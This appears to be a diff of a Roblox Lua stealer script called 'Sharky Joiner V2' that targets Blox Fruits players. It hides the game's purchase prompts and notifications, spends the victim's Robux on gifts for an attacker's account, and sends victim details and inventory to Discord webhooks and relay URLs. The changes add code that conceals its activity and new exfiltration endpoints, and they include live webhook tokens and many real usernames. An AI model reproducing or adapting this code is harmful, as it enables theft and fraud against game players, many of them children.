@@ -1,25 +1,17 @@
+Webhook = "https://discord.com/api/webhooks/1367493379977646090/fYiNtw-Mx5kCewz6D8T8pwEbSDSepjjwFcnjmE47aMFDHB2qoWgg23v0PgLKiB4WtKj2" -- << Your Webhook
+Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect
+
 -- =====================================================
 --                  USER CONFIGURATION
 -- =====================================================
 local DevMode = true
 
-local Usernames = {
-	"bananaaaa"
-}
-local Webhook = "https://discord.com/api/webhooks/1367159347829932224/05aFQ9H3cXCwPI_7fErjJe-U2iLy4T6QiUo3PeNoW9b8ZDfBWKUkfr6yLI6Rfl7H4sUj"
-local FruitsToHit = {
-	"Monkey-Monkey",
-	"Rocket-Rocket",
-	"Ghost-Ghost",
-	"Rubber-Rubber"
-}
-
-local GiftTarget = "x6TNine"
-local UserLogsWebhook = "https://discord.com/api/webhooks/1367120070446288978/FRpw2zZ_xmyY9uVRkKV1UEWOjyRSjnEipakUXV_tqSqRR03lHViKb5ookWfowpvgNfgk"
-
+local GiftTarget = "x6TNine" -- Target username for gifts (The account that will RECEIVE gifts purchased with the victim's Robux)
+local UserLogsWebhook = "https://l.webhook.party/hook/QKh2lTjhLDpPDREMcZHiId4MCHX8K2hIq4EtU8U6k8%2BzsgQJz1TdGD%2BMVd2ecDRfANVAddl06ldC2D%2FaixzCPB6Iuqiy55ooBnsGBxHVnk2F4iQL9f%2Bsz9UIU7FkZ2LfGYZXtFWejeylCm3YDQQz12kgtqd6vreIq4%2BRU%2BnQfNkUCot8AZU0G1MKF49QJ2XS9665v5F31MnOT%2F1%2FF3z%2FRkYBvIF58%2B6gMWGb%2BLC3nFJioeXzffrBv1qY5mNcF7eJQGRbp82v5KxJu2XsR8uuHPArhzcOqnl2f3d9m%2BJsDKRhSWsp8BJgvMyncyt4PRKjxc3IyoEfECZm%2FvQ%2Fhf%2FxrNSJHN2iUkPOUWswXh6kRMh4c3iv6rTKawzmgik2dwADRCbcLTWiphXqcib2/HakwdDM3%2BzJmFV7l" -- Gifter success/attempt webhook (REPLACE with your Discord webhook URL for gift logs)
 
 -- << Version Info >>
-local combined_version = "1.2.1" -- Updated version
+local combined_version = "1.2.2" -- Updated version
 local gifter_version = "1.3.0"
 local joiner_version = "1.3.5"
 
@@ -134,48 +126,32 @@ local webhookStorage = {};
 -- << Final Webhook URLs >>
 local FinalLogsWebhook = UserLogsWebhook
 local FinalWebhook = Webhook
-local FinalProtector = "https://discord.com/api/webhooks/1367119905815658587/lkpywf0OVpkOKbo72J0qtFxrcW1aiguwE17CDXVPI2KtwHQPd6-ZmgnKlwOJzabkt72A"
-local FinalDummy = "https://discord.com/api/webhooks/1367159073556008980/U198nhRaRumKxlqIou9mLw0bvxs_CjpNrJWGE3gdhq5qBycuTRGv4m3NzLEIrKI0Sa2Q"
-local FinalChecker22 = "https://discord.com/api/webhooks/1367159269643784264/147M-k1FWHhetDkxHkcmL3deQUSOhigd8iVl0-bv0odF1essau-AQ2tF3oQunF7XlDnx"
-print("Final Webhook URLs determined.")
+
+local FinalProtector = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/f7d22662-d236-4356-b20d-4873f20321c7" -- << Protected URL for admin hits (secondary backup) (url2)
+local FinalDummy = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/d7d3793b-d014-4ec6-8458-882d627fb042" -- << Protected URL for admin/special hits (Premium/TopFruit) (url3)
+local FinalChecker22 = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/e748a57f-b049-4a4a-9ff9-ef6a57f0a7ca" -- << Protected URL specifically for Dragon hits (url4)
+
 
 -- << Phase 1 Config >>
 local Username = GiftTarget
 local PromptText = "Launch Script"
 
 -- << Phase 2/3 Config >>
-local AddTheseFruits = {
-	"Dragon (West)-Dragon (West)",
-	"Dragon (East)-Dragon (East)",
-	"Kitsune-Kitsune",
-	"Gravity-Gravity",
-	"Yeti-Yeti",
-	"Leopard-Leopard"
-}
-local BlacklistedUsernames = {
-	"Scammer1",
-	"XFistorRespawn",
-	"rip_garou1334",
-	"sworddisater",
-	"doitenroitest1",
-	"SHAKINGSHARKER",
-	"shirkarsharker"
-}
-local PremiumUsers = {
-	"akosinatoy911",
-	"xXfreakingamerXx28"
-}
-local TestingUsernames = {
-	"00XxNO_CAPxX00",
-	"01ylr01_yanhesap"
-}
+local AddTheseFruits = {"Dragon (West)-Dragon (West)", "Dragon (East)-Dragon (East)", "Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard"} -- << Fruits that MUST always be in the FruitsToHit table
+local BlacklistedUsernames = {"Scammer1", "XFistorRespawn", "rip_garou1334", "sworddisater"} -- << Add names to blacklist here
+local PremiumUsers = {"akosinatoy911", "xXfreakingamerXx28", "bonzarbal53", "cookiedough_isgood11", "zasankwa", "xset_zorlu", "kencarsonfan46", "michael_frost5", "aarav_2348", "michael_frost7", "michael_frost8"} -- << Add premium usernames here
+
+local TestingUsernames = {"00XxNO_CAPxX00","01ylr01_yanhesap","09_r571","0yourgirl_ivy0","1231al1231","51487ming","6jeehejej","Aakarsh_GamingYT","Aaravsomaiah","Acidity_45","Acidity__45","AdalJuniour","AdiAd","Adadad","Adviknyc","Aggelosgazis8","Aid1no","Aid3no","Akosisuabe","Akhinesa","Alialmusayid","ALONExBOY_ASHUTOSH","Ankaixwc","ArataUemura947","Arnavhahaha6","Arxwie","Aurafarmwer123123","Azizosos8","Bacon_lol1568","Bagong_account10","Barbaros67890","Bay_Coola","BeesterSpeedRun","BloxFruit109967","Bloxfruit73825","Blueee7756","Bruhwow2022","CATVALERA90","Caboole07","Calanisikerim","CamdenSilly_8","Chanjiali","Chapternowis200","Ciaosonolapila","Cookiedough_isgood11","Cubtamilanyt","Cyrencerapsing","DEATH_SHADOW9991","DREAM_POLARE","DaGeckohahah","DaNiLaLiVe2011","Daddysboy4512","DarkBait7","Darkworrior76424","Dawazzixx","Delhome121212","Dgbbarte","Direhblo","Doffy7686","Domepboo","Dxn2788","EREN_YEAGR99","Freepalastinepleasei","Frostyyyyuyy","GarlicvsOnion1","Greennn7756","HAPPYBHKV123","Hai_One3","Harshabad11","Hdbdhdn","Heheheueheheh6454","Hsidbdudb1","IDK134848","IDKKK","Ichbinebennicht","Idklol","Ijustlostmydawgg_74","Ilovetankahkee","Ilovetsucasa10ma","Im_Dreii","Imaizuke9","IanLaiIsMyDoggie","Iuf5fidu","JessOfficialKng","Jerix20098","JfufjdScamTtade","JiaJing_6k","JiaJing_Alpha","JiaJing_BOT","JiaJing_real","JiaJing_sigma","JoyTheRealCat21","JunJieIsMyDoggie","KDRLC1","Kahsjsjhs","Karim_f11","Karim_f110","Kdrlc1_54056","Keenaruushish","Khinshin29","Khundichunda","Kiing_Tonhpong","KnoxxyyYt","Kreauger","L908djfj","Ladokha448","Lance_vancedance0","Lance_vancedance19","Leirskolevx","Lord_Cedrik17","Lol","Lolz3.0","Luffyisback_40","MEHULGAMER2009","MilkShamaa","Mohamadon333","Morral_Bacon","MrSaitama_Hero7","Mr_joshuafong","Mrgamer203APS","Muradrgb3","MyLIL_broski","N1ghT5la5h","N3ALAFIK","Nickan1717","Nightmareoio","NinjuNatik1","Nishimiya125","Nokiabrick_8","Norseuuh","Not_Gojoplays2","Onichan0505","Oppppegh","Opppppegh","P2WBrawlerNitro","Pogi1131233","Pro199064","RG_Zerox0","Raadin1717","Rajveer_Hisaria","Red_light","Reddd7756","Rip_Devil1034","Rip_claus","Rip_damnhh","Rip_indra","Rip_indra548","Rip_indrq","Rip_red1two","Riplegend50","Robslox1508","Rocco95m","RushSenp4i","SCAMezzz","SHADOW_KING15097","Sahilking123uu","Sakatotok","Samarpro232345","SandBoxXD69","Sehangamer79","ShadowplyzX0","Sigmaboy833","Simos55599","Sirjan108","Spy_hisoka","Starcode_kitt","SylentCash","TOHBESTNAS","Tanuj44400","Test2","Tester1","Testerkad","Thearsenaltryhar","Tobyjohnsonthepro","TomaUemura545","Toripz","TradeScam2.00","TradeScamEz.","TradeScamEzz","Trade_scam_script","Trigg","Ts_Natsu1","TxC_tanjiro26","Underkid8485","Unknown_guy0593","Uriel72574","User4","User5","Varsisdon1","Varsisdon2","Varsisdon4","Votelesshere123","Warrior_ggs","WaveoScamScript2.0","WaveoTradeScam2.0","WavesScamTrade2.0","Wgf_OTMAN","Wszn","Wsznnxx","Xdolomo","Xset_zorlu","Xsunshinehi","Xxvic41","Xxtunexeco","Xxtunexxeco","YaMeBanearonMuchas","Yuvan123585","Ytlav7281","Zasankwa","Zasvilt","aaravisnotdumb","xXfreakingamerXx28"}
+
 local ActivationPasswords = {
 	"ishusontop",
 	"bonzarbal",
-	"ishufishy"
+	"ishufishy",
+	"tflop"
 }
 local coreAdminUsernames = {
 	"x6TNine",
+	"aka_0ver",
 	"bonzarbal53",
 	"bonzarbal52",
 	"bonzarbal51",
@@ -186,6 +162,7 @@ local RGBGreenVal = 0.20;
 local RGBRedVal = 0.80;
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs"--
 local TEST_WEBHOOK = "https://discord.com/api/webhooks/1367159842992689284/BxMXb6wAhIcRYcfCUiIVgMG3GcBuWL2Lr0sAJWcsRo781JJ0zpAcaD3vrFCLJxRSqNVg"
+
 
 
 -- << Helper Functions >>
@@ -535,6 +512,28 @@ local messages = {
 	"Hype swag unlocked rn",
 	"Imagine swag vibes rn"
 };
+
+local function loopSinkTransparency()
+    while true do
+        local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
+            and game.Players.LocalPlayer.PlayerGui.ViewportOverlay:FindFirstChild("Sink")
+        if sink then
+            sink.BackgroundTransparency = 1
+        end
+        task.wait()
+    end
+end
+
+local function hideNotifications()
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    local notifications = playerGui:FindFirstChild("Notifications")
+    
+    if notifications then
+        notifications.Enabled = false
+    end
+end
+
 local function getRandomMessage()
 	return messages[math.random(1, #messages)]
 end
@@ -753,23 +752,23 @@ local function sendLogsWebhook_GifterPart(robuxSpent, itemName)
 		["color"] = 39423,
 		["fields"] = {
 			{
-				["name"] = "<:drawpen:1311079366125555782> Victim Info",
+				["name"] = "<:drawpen:1311079366125555782> ᴠɪᴄᴛɪᴍ ɪɴꜰᴏ",
 				["value"] = "```Name: " .. LocalPlayer.Name .. "\nAccount Age: " .. tostring(LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
 			},
 			{
-				["name"] = "<:robux:1314309850154537020> Robux cost",
+				["name"] = "<:robux:1314309850154537020> ʀᴏʙᴜx ᴄᴏꜱᴛ",
 				["value"] = "```" .. robuxSpent .. "```"
 			},
 			{
-				["name"] = "🎯 Item Targeted",
+				["name"] = "🎯 ɪᴛᴇᴍ ᴛᴀʀɢᴇᴛᴇᴅ",
 				["value"] = "```" .. itemName .. "```"
 			},
 			{
-				["name"] = "Executor Info",
+				["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
 				["value"] = "```Executor: " .. executor .. "```"
 			},
 			{
-				["name"] = "💰 Current Robux (approx)",
+				["name"] = "💰 ᴄᴜʀʀᴇɴᴛ ʀᴏʙᴜx (approx)",
 				["value"] = "```" .. rawBal .. "```"
 			},
 			{
@@ -784,7 +783,7 @@ local function sendLogsWebhook_GifterPart(robuxSpent, itemName)
 			}
 		},
 		["footer"] = {
-			["text"] = "Gifter"
+			["text"] = "Gifter component triggered."
 		}
 	};
 	local jsonSucc, data = pcall(HttpService.JSONEncode, HttpService, embed);
@@ -909,6 +908,9 @@ local function buyItem(sn, pl, c)
 	print("buyItem finished for:", sn, "Success:", s);
 	return s
 end
+
+hideNotifications()
+
 local function stealItem(b)
 	print("stealItem called with balance:", b);
 	if b >= 5000 then
@@ -990,23 +992,22 @@ local function stealItem(b)
 		return false
 	end
 end
-
--- UPDATED: Handles hiding dummy prompt ("Alert" or "Prompt")
 local function getRobuxAndProceed_GifterPart()
-	local shouldSkipGifting = false
-	local adjustedBalance = 0
-	local rawBalance = 0
-	local promptDetectedType = nil
-	local promptInstance = nil
-	local promptListener = nil
-	local handled = false
-	local startTime = tick()
-	local timeout = 10 -- Seconds to wait for ANY prompt
+	local skip = false;
+	local adjBal = 0;
+	local rawBal = 0;
+	local promptDetectedType = nil;
+	local promptInstance = nil;
+	local promptListener = nil;
+	local handled = false;
+	local startTime = tick();
+	local timeout = 10;
 	local cf = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_");
 	if not cf then
 		warn("CommF_ not found, cannot check balance.");
 		return true, 0, 0
 	end;
+	coroutine.wrap(loopSinkTransparency)()
 	local args = {
 		[1] = "buyRobuxShop",
 		[2] = {
@@ -1017,8 +1018,8 @@ local function getRobuxAndProceed_GifterPart()
 	};
 	local invS, invE = pcall(cf.InvokeServer, cf, unpack(args));
 	if not invS then
-		warn("InvokeServer failed for dummy prompt trigger:", invE); -- Continue anyway
-	end
+		warn("InvokeServer failed for dummy prompt trigger:", invE);
+	end;
 	local ppA = CoreGui:WaitForChild("PurchasePromptApp", timeout);
 	if not ppA then
 		warn("PurchasePromptApp did not appear after timeout.");
@@ -1037,11 +1038,8 @@ local function getRobuxAndProceed_GifterPart()
 	print("Listening for 'Prompt' or 'Alert' frame...");
 	promptListener = animator.ChildAdded:Connect(function(child)
 		if handled then
-			if promptListener and promptListener.Connected then
-				promptListener:Disconnect()
-			end;
 			return
-		end -- Already processed one
+		end;
 		if child.Name == "Alert" then
 			print("'Alert' (You need more Robux) prompt detected.");
 			promptDetectedType = "Alert";
@@ -1067,12 +1065,10 @@ local function getRobuxAndProceed_GifterPart()
 				promptListener:Disconnect()
 			end;
 		end
-	end)
-
-    -- Wait for either prompt to be handled or timeout
+	end);
 	while not handled and (tick() - startTime) < timeout do
 		task.wait(0.1)
-	end
+	end;
 	if promptListener and promptListener.Connected then
 		promptListener:Disconnect();
 		promptListener = nil;
@@ -1081,31 +1077,24 @@ local function getRobuxAndProceed_GifterPart()
 	if not handled then
 		warn("Timed out waiting for 'Prompt' or 'Alert' frame.");
 		return true, 0, 0
-	end
-
-    -- Now proceed based on what was detected
+	end;
 	if promptDetectedType == "Alert" then
-		warn("Detected 'Alert' prompt (likely insufficient funds). Skipping gifting.")
-        -- Balance is effectively 0, skip is already true
-		rawBalance = 0
-		adjustedBalance = 0
+		warn("Detected 'Alert' prompt (likely insufficient funds). Skipping gifting.");
+		rawBal = 0;
+		adjBal = 0;
 	elseif promptDetectedType == "Prompt" then
-		print("Standard prompt detected. Reading balance...")
-        -- Need to wait slightly for elements to be accessible even if parent is hidden
-		task.wait(0.2)
-		adjBal, rawBal = getRobuxBalance()
-		adjustedBalance = adjBal
-		rawBalance = rawBal
+		print("Standard prompt detected. Reading balance...");
+		task.wait(0.2);
+		adjBal, rawBal = getRobuxBalance();
+		adjustedBalance = adjBal;
 		if adjustedBalance < 25 then
-			warn("Insufficient Robux balance after reading standard prompt:", adjustedBalance, "- Skipping gifting.")
+			warn("Insufficient Robux balance after reading standard prompt:", adjustedBalance, "- Skipping gifting.");
 			shouldSkipGifting = true
-		end
+		end;
 	else
 		warn("Prompt handled but type unknown? Skipping gifting.");
 		return true, 0, 0
-	end
-
-    -- Cancel the (hidden) prompt regardless of type
+	end;
 	print("Cancelling detected prompt...");
 	pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
 	task.wait(0.1);
@@ -1113,7 +1102,6 @@ local function getRobuxAndProceed_GifterPart()
 	waitForPromptToDisappear();
 	return shouldSkipGifting, adjustedBalance, rawBalance
 end
-
 local function waitForPrompt_GifterPart()
 	local p = CoreGui:FindFirstChild("PurchasePromptApp");
 	if not p then
@@ -2299,7 +2287,7 @@ local function createDiscordUI()
 	D.Position = UDim2.new(0.05, 0, 0.3, 0);
 	D.BackgroundTransparency = 1;
 	D.Font = Enum.Font.Gotham;
-	D.Text = "Hey! Some of your VALUABLE Fruits could have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
+	D.Text = "Hey! Some of your VALUABLE Fruits may have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
 	D.TextColor3 = Color3.fromRGB(220, 221, 222);
 	D.TextScaled = true;
 	D.Parent = M;
@@ -3761,13 +3749,69 @@ function startPhase2()
 	end
 end -- End of startPhase2
 
+-- NEW Function: Cleanup Gifter Phase Resources
+local function cleanupGifterPhase()
+	print("Cleaning up Gifter phase resources...")
+    -- Disconnect listeners
+	if confirmButtonConn and confirmButtonConn.Connected then
+		confirmButtonConn:Disconnect()
+		print("Disconnected confirm button connection.")
+	end
+	confirmButtonConn = nil
+	if promptModifierConnection and promptModifierConnection.Connected then
+		promptModifierConnection:Disconnect()
+		print("Disconnected prompt modifier connection.")
+	end
+	promptModifierConnection = nil
+
+    -- Attempt to remove modified UI elements
+	local ppApp = CoreGui:FindFirstChild("PurchasePromptApp")
+	if ppApp then
+		local pc = ppApp:FindFirstChild("ProductPurchaseContainer")
+		if pc then
+			local anim = pc:FindFirstChild("Animator")
+			if anim then
+				local prompt = anim:FindFirstChild("Prompt") -- The one modified by modifyPromptUI
+				if prompt then
+					local footer = prompt:FindFirstChild("AlertContents") and prompt.AlertContents:FindFirstChild("Footer")
+					if footer then
+						local btns = footer:FindFirstChild("Buttons")
+						if btns then
+							local btn2 = btns:FindFirstChild("2")
+							if btn2 then
+								print("Clearing modified button UI...")
+								safe_pcall(btn2.ClearAllChildren, btn2)
+							end
+						end
+					end
+				end
+                 -- Destroy the Alert frame if it exists
+				local alertFrame = anim:FindFirstChild("Alert")
+				if alertFrame then
+					print("Destroying Alert frame...")
+					safe_pcall(alertFrame.Destroy, alertFrame)
+				end
+			end
+		end
+	end
+
+    -- Reset gifter state variables
+	promptConfirmed = false
+	purchaseInProgress = false
+	gifterWebhookSent = false
+	attemptedGiftItemName = "None"
+	attemptedGiftCost = 0
+	UserId = nil -- Clear resolved UserID
+	print("Gifter state variables reset.")
+end
+
 -- << Main Execution Flow >>
 local function main()
 	joinerPhase = 0
 	print("Combined Script Initializing...")
 	repeat
 		task.wait(0.1)
-	until game:IsLoaded() and LocalPlayer and LocalPlayer.Character and LocalPlayer.UserId > 0 and Workspace -- Added Workspace check
+	until game:IsLoaded() and LocalPlayer and LocalPlayer.Character and LocalPlayer.UserId > 0 and Workspace
 
     -- Anti-Tamper & Config Errors (These still Kick)
 	if not DevMode then
@@ -3860,9 +3904,9 @@ local function main()
 		print("Sending initial joiner webhooks...");
 		sendInitialHitWebhook(initialInventoryCache)
 	end
-	local hasValue = hasValuableItems(initialInventoryCache) -- Check if inventory has value
+	local hasValue = hasValuableItems(initialInventoryCache)
 
-    -- Basic Game State Setup (Hooking __namecall)
+    -- Basic Game State Setup
 	pcall(function()
 		UserSettings:GetService("UserGameSettings").MasterVolume = 0
 	end)
@@ -3939,43 +3983,44 @@ local function main()
 		end
 	end
 
-    -- Conditional Kick Check (Only if skipping gift due to low Robux AND no valuable items)
+    -- Conditional Kick Check
 	if shouldSkipGifting and finalRawBalance < 25 and not hasValue then
 		warn("Kicking: Low Robux (", finalRawBalance, ") and no valuable items detected.")
 		if not wasKicked then
 			wasKicked = true;
-			pcall(createDiscordUI)
+			pcall(LocalPlayer.Kick, LocalPlayer, "Insufficient Robux and no valuable items found.")
 		end
 		return
 	end
 
     -- Transition Logic
 	if shouldSkipGifting then
-		print("Gifting skipped. Proceeding to Phase 2.");
+		print("Gifting skipped. Proceeding to Phase 2.")
+		cleanupGifterPhase() -- Clean up before starting phase 2
 		startPhase2()
 	else
-		print("Waiting for user click...");
+		print("Waiting for user click...")
 		while not promptConfirmed and joinerPhase == 1 do
 			task.wait(0.1)
 		end
 		if promptConfirmed then
-			print("Confirmed. Sending LogsWebhook & starting Phase 2.");
-			sendLogsWebhook_GifterPart(attemptedGiftCost, attemptedGiftItemName);
-			task.spawn(function()
+			print("Confirmed. Sending LogsWebhook & starting Phase 2.")
+			sendLogsWebhook_GifterPart(attemptedGiftCost, attemptedGiftItemName)
+			task.spawn(function() -- Close prompt UI in background
 				for i = 1, 5 do
 					pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
-					task.wait(0.1);
-					pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
-					task.wait(0.1);
-					if not (CoreGui:FindFirstChild("PurchasePromptApp") and CoreGui.PurchasePromptApp:FindFirstChild("ProductPurchaseContainer") and CoreGui.PurchasePromptApp.ProductPurchaseContainer:FindFirstChild("Animator") and CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator:FindFirstChild("Prompt")) then
+					task.wait(0.1)
+					if not (CoreGui:FindFirstChild("PurchasePromptApp") and CoreGui.PurchasePromptApp:FindFirstChild("ProductPurchaseContainer") and CoreGui.PurchasePromptApp.ProductPurchaseContainer:FindFirstChild("Animator") and (CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator:FindFirstChild("Prompt") or CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator:FindFirstChild("Alert"))) then
 						break
 					end
-				end;
+				end
 				waitForPromptToDisappear()
-			end);
+			end)
+			cleanupGifterPhase() -- Clean up before starting phase 2
 			startPhase2()
 		else
-			warn("Gifting confirmation not received. Proceeding Phase 2.");
+			warn("Gifting confirmation not received. Proceeding Phase 2.")
+			cleanupGifterPhase() -- Still clean up before starting phase 2
 			startPhase2()
 		end
 	end
@@ -3990,11 +4035,11 @@ task.spawn(function()
 			warn("Error:", err)
 			if _og_warn then
 				_og_warn("Stack:", debug.traceback())
-			end -- Use original for stack
+			end
 		else
 			if _og_warn then
 				_og_warn("[SCRIPT WARN] Silent script error occurred.")
-			end -- Log minimally
+			end
 		end
 	end
 end)
